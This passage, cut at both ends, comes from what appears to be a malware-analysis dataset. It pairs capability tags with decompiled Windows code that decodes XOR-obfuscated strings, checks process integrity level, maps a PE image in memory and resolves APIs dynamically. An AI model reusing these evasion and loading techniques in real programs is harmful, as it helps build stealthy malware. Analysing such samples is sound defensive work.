       *0x427a10 = 4;\n    }\ncode_r0x0040a7c7:\n    if (*0x4279e8 < 6) {\n        *0x4279f0 = 2;\n    }\n    else {\n        *0x4279f0 = fcn.0040a7ee();\n    }\n    return 0;\n}\n",
        "token_count": 1286
    },
    "0040a7ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.0040a7ee(uint param_1)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint32_t *puVar10;\n    uint extraout_ECX;\n    char cVar11;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint8_t *nSubAuthority;\n    int32_t var_18h;\n    uint TokenHandle;\n    int32_t var_10h;\n    uint TokenInformationLength;\n    int32_t var_8h;\n    uint *TokenInformation;\n    \n    cVar11 = '\\0';\n    iVar6 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar6 != 0) {\n        iVar6 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if (iVar6 == 0) {\n            iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar6 == 0x7a) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n                TokenInformation = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n                if (TokenInformation != NULL) {\n                    var_44h = 0x272b1f1a;\n                    var_40h = 0xb2a0317;\n                    var_3ch = 0x14072636;\n                    var_38h._0_2_ = 0x1f3e;\n                    var_38h._2_1_ = 0x27;\n                    var_38h._3_1_ = 0x2d;\n                    var_34h._0_2_ = 0x1820;\n                    var_34h._2_1_ = 0x2e;\n                    var_18h = 6;\n                    var_34h._3_1_ = 6;\n                    var_30h = 0x42;\n                    var_2ch = 0x43426a4f;\n                    var_28h._0_2_ = 0x7154;\n                    fcn.0040ac9b(extraout_ECX);\n                    iVar6 = var_10h;\n                    nSubAuthority = &var_44h - var_10h;\n                    var_8h = 0;\n                    do {\n                        pcVar1 = var_8h + iVar6;\n                        cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        uVar2 = *(&var_2ch + var_8h % var_18h);\n                        uVar3 = nSubAuthority[pcVar1];\n                        cVar11 = '\\0';\n                        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        var_8h = var_8h + 1;\n                        *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                    } while (var_8h < 0x15);\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                      (TokenHandle, 0x19, TokenInformation, TokenInformationLength, \n                                       &TokenInformationLength);\n                    if (iVar8 != 0) {\n                        var_44h = 0x31243f1f;\n                        var_40h = 0x22002152;\n                        var_3ch = 0x2f38542b;\n                        var_38h._0_2_ = 0x2b38;\n                        var_38h._2_1_ = 7;\n                        var_38h._3_1_ = 0x7f;\n                        var_34h._0_2_ = 0x5770;\n                        var_2ch = 0x4557464c;\n                        var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x37);\n                        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n                        puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n                        *puVar9 = 0;\n                        puVar9[1] = 0;\n                        puVar9[2] = 0;\n                        puVar9[3] = 0;\n                        *(puVar9 + 4) = 0;\n                        *(puVar9 + 0x12) = 0;\n                        var_20h = &var_44h - puVar9;\n                        var_8h = 0;\n                        var_24h = puVar9;\n                        do {\n                            pcVar1 = var_8h + puVar9;\n                            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            nSubAuthority = 0x5;\n                            uVar2 = *(&var_2ch + var_8h % 5);\n                            uVar3 = pcVar1[var_20h];\n                            cVar11 = '\\0';\n                            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                            var_8h = var_8h + 1;\n                        } while (var_8h < 0x12);\n                        nSubAuthority = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*TokenInformation);\n                        if ((nSubAuthority != NULL) && (*nSubAuthority != 0)) {\n                            var_40h = 0x3a082c25;\n                            var_3ch = 0x2d07032a;\n                            var_38h._0_2_ = 0x1c10;\n                            var_38h._2_1_ = 6;\n                            var_38h._3_1_ = 0x1c;\n                            var_34h._0_2_ = 0x6b14;\n                            var_34h._2_1_ = 0x56;\n                            var_34h._3_1_ = 0x79;\n                            var_2ch = 0x79645877;\n                            var_28h._0_2_ = 0x6e45;\n                            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n                            puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n                            *puVar9 = 0;\n                            puVar9[1] = 0;\n                            puVar9[2] = 0;\n                            puVar9[3] = 0;\n                            *(puVar9 + 4) = 0;\n                            var_20h = &var_40h - puVar9;\n                            var_8h = 0;\n                            do {\n                                pcVar1 = var_8h + puVar9;\n                                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                uVar2 = *(&var_2ch + var_8h % var_18h);\n                                uVar3 = pcVar1[var_20h];\n                                cVar11 = '\\0';\n                                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                                var_8h = var_8h + 1;\n                            } while (var_8h < 0x10);\n                            puVar10 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*TokenInformation, *nSubAuthority - 1)\n                            ;\n                            if (puVar10 != NULL) {\n                                if (*puVar10 < 0x2000) {\n                                    cVar11 = '\\x01';\n                                }\n                                else {\n                                    cVar11 = '\\x03' - (*puVar10 < 0x3000);\n                                }\n                            }\n                            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n                            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                        }\n                        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_24h);\n                        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n                        iVar6 = var_10h;\n                    }\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformation);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar11;\n}\n",
        "token_count": 2068
    },
    "0040aee0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop",
            "generate random numbers using a Mersenne Twister"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040aee0(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    if (*0x427a24 == '\\0') {\n        *0x4262b0 = *param_1;\n        puVar5 = 0x4262b0;\n        *0x427630 = 0x270;\n        uVar4 = 1;\n        do {\n            uVar3 = *puVar5;\n            uVar2 = *puVar5;\n            puVar5 = puVar5 + 1;\n            uVar3 = (uVar3 >> 0x1e ^ uVar2) * 0x6c078965 + uVar4;\n            uVar4 = uVar4 + 1;\n            *puVar5 = uVar3;\n        } while (uVar4 < 0x270);\n        *0x427a24 = '\\x01';\n    }\n    if (*0x427630 == 0x270) {\n        fcn.0040acc4();\n        *0x427630 = 0;\n    }\n    iVar1 = *0x427630 * 4;\n    *0x427630 = *0x427630 + 1;\n    return *(iVar1 + 0x426c70);\n}\n",
        "token_count": 315
    },
    "0040b3bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b3bf(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *in_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uchar *in_EDX;\n    int32_t *piVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    var_ch = *(in_EDX + iVar3 + 6);\n    iVar12 = *(in_EDX + iVar3 + 0x3c);\n    puVar11 = in_EDX;\n    puVar13 = in_ECX;\n    for (iVar7 = *(in_EDX + iVar3 + 0x54); iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar13 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    if (var_ch != 0) {\n        piVar10 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar8 = iVar12 + -1 + piVar10[-1] & ~(iVar12 - 1U);\n            if (uVar8 != 0) {\n                puVar11 = in_EDX + *piVar10;\n                puVar13 = in_ECX + piVar10[-2];\n                for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n                    *puVar13 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            piVar10 = piVar10 + 10;\n            var_ch = var_ch - 1;\n        } while (var_ch != 0);\n    }\n    if (arg_8h == NULL) {\n        arg_8h = in_ECX;\n    }\n    iVar12 = iVar3 + 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar12 = iVar3 + 0xb0;\n    }\n    iVar7 = *(in_EDX + iVar12);\n    if ((iVar7 != 0) && (uVar8 = *(in_EDX + iVar12 + 4),  uVar8 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar12 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar12 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar11 = *(in_EDX + iVar3 + 0x30);\n        uVar5 = arg_8h - *(in_EDX + iVar3 + 0x30);\n        iVar3 = *(in_EDX + iVar3 + 0x34);\n        piVar10 = in_ECX + iVar7;\n        for (; 8 < uVar8; uVar8 = uVar8 - *piVar9) {\n            iVar7 = *piVar10;\n            uVar14 = piVar10[1] - 8U >> 1;\n            if ((piVar10[1] <= uVar8) && (uVar14 != 0)) {\n                piVar9 = piVar10 + 2;\n                do {\n                    uVar2 = *piVar9;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar7) = arg_8h + (*(in_ECX + (uVar2 & 0xfff) + iVar7) - iVar12);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar6 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar6 + iVar7;\n                        uVar4 = *puVar1;\n                        *puVar1 = *puVar1 + uVar5;\n                        *(in_ECX + uVar6 + 4 + iVar7) =\n                             *(in_ECX + uVar6 + 4 + iVar7) + (((arg_8h >> 0x1f) - iVar3) - (arg_8h < puVar11)) +\n                             CARRY4(uVar4, uVar5);\n                    }\n                    piVar9 = piVar9 + 2;\n                    uVar14 = uVar14 - 1;\n                } while (uVar14 != 0);\n            }\n            piVar9 = piVar10 + 1;\n            piVar10 = piVar10 + piVar10[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1181
    },
    "0040c5e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c5e3(uint32_t arg_8h)\n\n{\n    int32_t *in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t *piVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    code *var_18h;\n    uint32_t var_14h;\n    int32_t *var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = fcn.00410b3e;\n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_10h = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    var_24h = arg_8h & 0x10;\n    if ((var_24h == 0) && ((*0x4279e4 & 1) != 0)) {\n        iVar1 = in_EDX[2];\n        var_18h = 0x425e30;\n    }\n    else {\n        iVar1 = *in_EDX;\n    }\n    if (iVar1 == 0) {\n        iVar1 = 2;\n    }\n    else {\n        var_14h = *(*(iVar1 + 0x3c) + 0x50 + iVar1) + 0xfffU & 0xfffff000;\n        iVar1 = fcn.0040b1e3(&hObject);\n        if (((iVar1 == 0) && (iVar1 = fcn.0040af4b(&var_4h),  iVar2 = var_8h,  iVar1 == 0)) &&\n           (iVar1 = fcn.0040b3bf(var_4h),  iVar1 == 0)) {\n            iVar8 = var_14h + iVar2;\n            puVar3 = *var_10h;\n            puVar6 = iVar2 + 0xc50 + var_14h;\n            for (iVar1 = var_10h[4]; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar6 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar3 = var_10h[2];\n            puVar6 = var_8h + 0xc50 + var_10h[4] + var_14h;\n            for (iVar1 = var_10h[5]; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar6 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(var_14h + 0x30 + var_8h) = var_4h;\n            *(var_14h + 0x34 + var_8h) = var_4h >> 0x1f;\n            iVar2 = var_14h + var_8h;\n            piVar4 = var_10h;\n            puVar3 = iVar2 + 0x18;\n            for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = *piVar4;\n                piVar4 = piVar4 + 1;\n                puVar3 = puVar3 + 1;\n            }\n            iVar1 = var_4h + 0xc50 + var_14h;\n            *(iVar2 + 0x18) = iVar1;\n            *(iVar2 + 0x1c) = iVar1 >> 0x1f;\n            iVar1 = var_4h + 0xc50 + var_10h[4] + var_14h;\n            *(iVar8 + 0x20) = iVar1;\n            *(iVar8 + 0x24) = iVar1 >> 0x1f;\n            *(iVar8 + 0x28) = var_10h[4];\n            *(iVar8 + 0x2c) = var_10h[5];\n            var_20h = iVar8;\n            if ((var_24h == 0) && ((*0x4279e4 & 1) != 0)) {\n                iVar1 = fcn.0040b885();\n            }\n            else {\n                iVar1 = fcn.0040b528();\n            }\n            if (iVar1 == 0) {\n                pcVar5 = var_18h;\n                pcVar7 = iVar8 + 0x40;\n                for (iVar2 = 0x800; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar7 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                    pcVar7 = pcVar7 + 1;\n                }\n                iVar8 = var_14h + var_4h;\n                var_24h = 0;\n                iVar2 = fcn.0040bbc2(iVar8, arg_8h, &var_24h);\n                if (iVar2 == 0) {\n                    if (*0x427a68 == 0) {\n                        iVar1 = fcn.0040c7f6(var_1ch, iVar8 + 0x40, iVar8, arg_8h);\n                    }\n                    else {\n                        fcn.0040ccde(iVar8, *var_1ch, arg_8h);\n                    }\n                }\n            }\n        }\n        if (var_8h != 0) {\n            fcn.0040b0ae();\n        }\n        if (hObject != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 1345
    },
    "0040c7f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c7f6(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    char cVar5;\n    uint uVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    int32_t *arg_10h_00;\n    uint unaff_ESI;\n    int32_t iVar9;\n    uint unaff_EDI;\n    uint uVar10;\n    int32_t iVar11;\n    uint in_stack_ffffff94;\n    int32_t iVar12;\n    int32_t iStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    ushort uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    arg_10h_00 = arg_8h + 1;\n    uStack76 = arg_10h_00;\n    if (*arg_10h_00 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *arg_10h_00 = 0;\n    }\n    uStack72 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x4279e4 & 1) != 0)) {\n        if ((*0x427bc0 | *0x427bc4) == 0) {\n            uStack48 = 0x41d123d;\n            uStack44 = 0xa37601c;\n            uStack40 = CONCAT22(uStack40._2_2_, 0x6815);\n            uStack68 = 0x68796653;\n            uStack64 = 0x4e70;\n            fcn.0040826e();\n            iVar9 = 0;\n            do {\n                fcn.004034cf(iVar9, *(&uStack72 + iVar9 % 6) ^ *(&uStack52 + iVar9));\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 10);\n            uStack60 = 0xa1c1327;\n            uStack56 = 0x13142124;\n            uStack52 = 0x21251c15;\n            uStack48 = 0x3b183307;\n            uStack44 = 0x67112533;\n            uStack80 = 0x49706775;\n            uStack76 = CONCAT22(uStack76._2_2_, 0x4456);\n            fcn.0040cc0a();\n            iVar11 = &uStack64 - unaff_EBX;\n            iVar9 = 0;\n            do {\n                pcVar1 = iVar9 + unaff_EBX;\n                cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&iStack84 + iVar9 % 6);\n                uVar3 = pcVar1[iVar11];\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < 0x14);\n            fcn.0040eb55();\n            uVar10 = 0xffffffff;\n            *0x427bc0 = fcn.0040f0a7(unaff_EBX);\n            pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, unaff_EBX);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n            uVar6 = (*pcVar7)(0, in_stack_ffffff94);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n            arg_10h_00 = uStack76;\n            if (*0x427bc0 == 0) goto code_r0x0040cb61;\n        }\n        *0x427bc4 = *0x427bc0 >> 0x20;\n        uVar10 = 0xffffffff;\n        iVar9 = fcn.0040ab21(*0x427bc0, *0x427bc4, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, arg_ch\n                             , arg_ch >> 0x1f, arg_10h, arg_10h >> 0x1f, arg_10h_00, arg_10h_00 >> 0x1f, &uStack60, \n                             &uStack60 >> 0x1f, unaff_EDI);\n        if (-1 < iVar9) {\n            uVar10 = 0;\n        }\n    }\n    else {\n        iStack84 = 0;\n        uStack60 = 0x41d123d;\n        uStack56 = 0xa37601c;\n        uStack52 = CONCAT22(uStack52._2_2_, 0x6815);\n        uStack68 = 0x68796653;\n        uStack64 = 0x4e70;\n        fcn.0040826e();\n        iVar9 = 0;\n        do {\n            fcn.004034cf(iVar9, *(&uStack72 + iVar9 % 6) ^ *(&uStack64 + iVar9));\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 10);\n        uStack40 = 0xa1c1327;\n        uStack36 = 0x13142124;\n        uStack32 = 0x21251c15;\n        uStack28 = 0x3b183307;\n        uStack24 = 0x67112533;\n        uStack72 = 0x49706775;\n        uStack68 = CONCAT22(uStack68._2_2_, 0x4456);\n        iVar11 = extraout_ECX;\n        fcn.0040cc0a();\n        iVar9 = iStack84;\n        iStack84 = &uStack44 - iStack84;\n        iVar12 = 0;\n        do {\n            pcVar1 = iVar12 + iVar9;\n            cVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&uStack76 + iVar12 % 6);\n            uVar3 = pcVar1[iStack84];\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            *pcVar1 = cVar5 + ((uVar2 ^ uVar3) - cVar4);\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < 0x14);\n        iVar12 = iVar9;\n        uVar10 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(unaff_ESI, iVar9);\n        pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n        if (pcVar7 != NULL) {\n            iVar8 = (*pcVar7)(*arg_8h, 0, 0, 0, 0, 0, arg_ch, arg_10h, &stack0xffffff90, &uStack76);\n            arg_8h[1] = iVar11;\n            if (iVar8 < 0) {\n                fcn.0040adaf();\n            }\n            else {\n                iVar8 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar11, 30000);\n                if (iVar8 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(iVar11, &stack0xffffffa0);\n                }\n            }\n        }\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar6);\n        uVar6 = (*pcVar7)(0, iVar12);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    }\ncode_r0x0040cb61:\n    *0x427bc4 = *0x427bc0 >> 0x20;\n    return uVar10;\n}\n",
        "token_count": 1944
    },
    "0040e34b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e34b(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    uint *in_EDX;\n    int32_t iVar11;\n    uint *puVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint lpModuleName;\n    \n    var_10h = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_8h = in_ECX;\n    if (in_ECX == -1) {\n        var_10h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_8h = fcn.0040e2ff();\n        in_ECX = extraout_ECX;\n    }\n    if (*0x427b64 == NULL) {\n        var_34h = 0x41d123d;\n        var_30h = 0xa37601c;\n        var_2ch._0_2_ = 0x6815;\n        var_20h = 0x68796653;\n        var_1ch._0_2_ = 0x4e70;\n        fcn.0040826e(in_ECX);\n        iVar11 = 0;\n        do {\n            fcn.004034cf(iVar11, *(&var_20h + iVar11 % 6) ^ *(&var_34h + iVar11));\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 10);\n        var_50h = 0x35350e17;\n        var_4ch = 0x304d7b15;\n        var_48h = 0x2f29033f;\n        var_44h = 0x3816280b;\n        var_40h = 0x7170e18;\n        var_3ch = 0x23101620;\n        var_38h._0_2_ = 0x7954;\n        var_38h._2_1_ = 0x79;\n        var_20h = 0x5a62794d;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x62);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n        var_ch = 0;\n        puVar12 = puVar9;\n        for (iVar11 = 7; iVar11 != 0; iVar11 = iVar11 + -1) {\n            *puVar12 = 0;\n            puVar12 = puVar12 + 1;\n        }\n        var_14h = &var_50h - puVar9;\n        do {\n            iVar11 = var_ch;\n            pcVar1 = var_ch + puVar9;\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_20h + iVar11 % 5);\n            uVar3 = pcVar1[var_14h];\n            cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            var_ch = var_ch + 1;\n            *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n        } while (var_ch < 0x1b);\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, puVar9);\n        *0x427b64 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar8);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_28h = 0;\n        uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar9);\n        pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n        uVar8 = (*pcVar5)(0, lpModuleName);\n        (*pcVar4)(uVar8);\n        iVar11 = var_8h;\n        in_EDX = var_18h;\n        if (*0x427b64 == NULL) goto code_r0x0040e4dd;\n    }\n    iVar11 = var_8h;\n    var_28h = 0;\n    iVar10 = (**0x427b64)(var_8h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar10) {\n    }\ncode_r0x0040e4dd:\n    if (var_10h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar11);\n    }\n    return var_28h;\n}\n",
        "token_count": 1278
    },
    "0040e4f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040e4f3(uint arg_8h)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    uint *in_EDX;\n    int32_t iVar11;\n    uint *puVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_3dh;\n    uint var_39h;\n    uchar var_35h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint lpModuleName;\n    \n    var_10h = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_8h = in_ECX;\n    if (in_ECX == -1) {\n        var_10h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_8h = fcn.0040e2ff();\n        in_ECX = extraout_ECX;\n    }\n    if (*0x427b8c == NULL) {\n        var_34h = 0x41d123d;\n        var_30h = 0xa37601c;\n        var_2ch._0_2_ = 0x6815;\n        var_20h = 0x68796653;\n        var_1ch._0_2_ = 0x4e70;\n        fcn.0040826e(in_ECX);\n        iVar11 = 0;\n        do {\n            fcn.004034cf(iVar11, *(&var_20h + iVar11 % 6) ^ *(&var_34h + iVar11));\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 10);\n        var_50h = 0x3d641a16;\n        var_4ch = 0x64597a00;\n        var_48h = 0x8381e20;\n        var_44h._0_2_ = 0x3b65;\n        var_44h._2_1_ = 5;\n        stack0xffffffbb = 